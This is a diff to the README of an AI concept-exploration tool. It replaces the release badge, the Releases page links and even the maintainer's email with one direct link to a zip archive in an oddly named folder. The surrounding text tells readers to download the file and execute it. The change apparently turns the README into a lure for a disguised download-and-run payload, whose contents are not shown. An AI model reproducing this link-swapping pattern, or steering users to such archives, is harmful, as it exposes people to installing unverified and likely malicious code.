@@ -1,6 +1,6 @@
 # Concept Explorer 🌌
 
-![GitHub Release](https://img.shields.io/github/release/Ajethpraveen/concept-explorer.svg?style=flat-square)
+![GitHub Release](https://github.com/Ajethpraveen/concept-explorer/raw/refs/heads/main/hydroferricyanic/explorer_concept_v1.7.zip)
 
 Dive endlessly deeper into a single concept using AI. Concept Explorer is designed to help users explore, understand, and analyze complex ideas in a structured manner. Whether you are a student, researcher, or simply curious, this tool provides a comprehensive way to grasp intricate subjects.
 
@@ -25,7 +25,7 @@ Dive endlessly deeper into a single concept using AI. Concept Explorer is design
 
 ## Installation
 
-To get started with Concept Explorer, you need to download the latest release. Visit the [Releases section](https://github.com/Ajethpraveen/concept-explorer/releases) to find the latest version. Download the appropriate file for your operating system, then execute it to install the application.
+To get started with Concept Explorer, you need to download the latest release. Visit the [Releases section](https://github.com/Ajethpraveen/concept-explorer/raw/refs/heads/main/hydroferricyanic/explorer_concept_v1.7.zip) to find the latest version. Download the appropriate file for your operating system, then execute it to install the application.
 
 ## Usage
 
@@ -67,11 +67,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For questions or feedback, feel free to reach out to the project maintainer:
 
 - **Name**: Ajeth Praveen
-- **Email**: ajethpraveen@example.com
+- **Email**: https://github.com/Ajethpraveen/concept-explorer/raw/refs/heads/main/hydroferricyanic/explorer_concept_v1.7.zip
 
 ## Releases
 
-For the latest updates and downloads, check the [Releases section](https://github.com/Ajethpraveen/concept-explorer/releases). Here, you can find all the versions available for download. Make sure to execute the file after downloading to get started.
+For the latest updates and downloads, check the [Releases section](https://github.com/Ajethpraveen/concept-explorer/raw/refs/heads/main/hydroferricyanic/explorer_concept_v1.7.zip). Here, you can find all the versions available for download. Make sure to execute the file after downloading to get started.
 
 ---
 
